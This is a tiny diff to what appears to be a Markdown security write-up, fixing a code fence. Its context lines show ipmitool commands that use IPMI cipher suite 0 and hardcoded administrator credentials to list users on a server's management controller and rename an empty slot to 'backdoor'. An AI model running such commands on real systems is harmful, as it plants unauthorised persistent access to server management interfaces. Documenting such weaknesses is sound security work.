@@ -85,7 +85,7 @@ $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user li
 ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
 1  Administrator    true    false      true      ADMINISTRATOR
 2  (Empty User)    true    false      false      NO ACCESS
-`` 
+```
 $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set name 2 backdoor
 ```
 ```
